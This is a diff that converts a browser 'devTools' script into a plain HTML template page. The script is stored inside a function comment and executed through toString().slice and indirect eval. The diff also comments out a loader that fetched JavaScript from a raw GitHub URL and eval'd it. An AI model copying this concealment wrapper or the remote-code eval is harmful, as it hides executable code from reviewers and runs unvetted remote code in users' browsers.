@@ -1,27 +1,33 @@
-/// devTools.js (combined with runscript.js)
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<script>
+(0,eval)((function(){/*!
 !function(){
 
   var STORE_KEY   = "__devToolsScripts";
   var chiiState   = 0;
   var _managerWin = null;
 
-  // ── External script loader (non-fatal) ────────────────────────────
-  try {
-    var _rx = new XMLHttpRequest();
-    _rx.open('GET','https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js',true);
-    _rx.onload = function(){
-      if(_rx.status === 200){
-        try{ (0,eval)(_rx.responseText); }
-        catch(e){ console.warn('[devTools] external script eval error:', e); }
-      }
-    };
-    _rx.onerror = function(){
-      console.warn('[devTools] external script load failed (XHR blocked — likely CSP). Continuing without it.');
-    };
-    _rx.send();
-  } catch(e) {
-    console.warn('[devTools] external script XHR skipped:', e);
-  }
+  // ── External script loader (DISABLED) ────────────────────────────
+  // try {
+  //   var _rx = new XMLHttpRequest();
+  //   _rx.open('GET','https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js',true);
+  //   _rx.onload = function(){
+  //     if(_rx.status === 200){
+  //       try{ (0,eval)(_rx.responseText); }
+  //       catch(e){ console.warn('[devTools] external script eval error:', e); }
+  //     }
+  //   };
+  //   _rx.onerror = function(){
+  //     console.warn('[devTools] external script load failed (XHR blocked — likely CSP). Continuing without it.');
+  //   };
+  //   _rx.send();
+  // } catch(e) {
+  //   console.warn('[devTools] external script XHR skipped:', e);
+  // }
 
   // ── Storage ───────────────────────────────────────────────────────
   function loadScripts(){
@@ -377,3 +383,13 @@
   });
 
 }();
+*/}).toString().slice(16,-3))
+</script>
+<body>
+
+<h1>My First Heading</h1>
+<p>My first paragraph.</p>
+
+</body>
+</html>
+
